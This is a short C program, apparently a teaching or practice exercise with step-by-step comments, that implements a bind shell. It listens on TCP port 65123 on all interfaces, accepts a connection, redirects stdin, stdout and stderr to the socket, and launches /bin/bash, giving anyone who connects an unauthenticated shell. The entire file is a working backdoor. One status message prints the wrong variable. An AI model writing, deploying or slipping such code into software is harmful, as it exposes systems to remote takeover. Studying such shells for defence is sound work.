#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main(void) {
    // Create IPv4 socket, returns a file descriptor
    int openedSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (openedSocket == -1) {
        perror("Error during opening of socket");
    } else {
        printf("File descriptor socket: %d\n", openedSocket);
    }

    // Allow socket address to be reused
    int optval = 1;
    setsockopt(openedSocket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    // Define internet socket address
    struct sockaddr_in socketAddress;

    // Use IPv4
    socketAddress.sin_family = AF_INET;
    // Use any interface
    socketAddress.sin_addr.s_addr = INADDR_ANY;
    // Set port number
    socketAddress.sin_port = htons(65123);

    // Convert socketAddress to sockaddr and pass its address
    int bindStatus = bind(openedSocket, (struct sockaddr *)&socketAddress, sizeof(socketAddress));

    if (bindStatus == -1) {
        perror("Error during binding of socket");
    } else {
        printf("Bind socket status: %d\n", bindStatus);
    }

    // Listen for connections
    int listenStatus = listen(openedSocket, 0);

    if (listenStatus == -1) {
        perror("Error during listening on socket");
    } else {
        printf("Listen socket status: %d\n", listenStatus);
    }

    // Accept connection on socket without set addr, returns a file descriptor
    int acceptedConnection = accept(openedSocket, NULL, NULL);

    if (acceptedConnection == -1) {
        perror("Error during accepting connection");
    } else {
        printf("File descriptor connection: %d\n", acceptedConnection);
    }

    // Stream names
    char streams[3][10] = { "stdin", "stdout", "stderr" };

    // Duplicate socket file descriptor to stdin, stdout, stderr
    for (int i = 0; i < 3; ++i) {
        int duplicateStatus = dup2(acceptedConnection, i);

        if (duplicateStatus == -1) {
            perror("Error during duplicating file descriptor");
        } else {
            printf("Duplicate status %s: %d\n", streams[i], listenStatus);
        }
    }

    // Start bash shell
    execve("/bin/bash", NULL, NULL);

    // Close socket after bash terminates
    close(openedSocket);

    return 0;
}
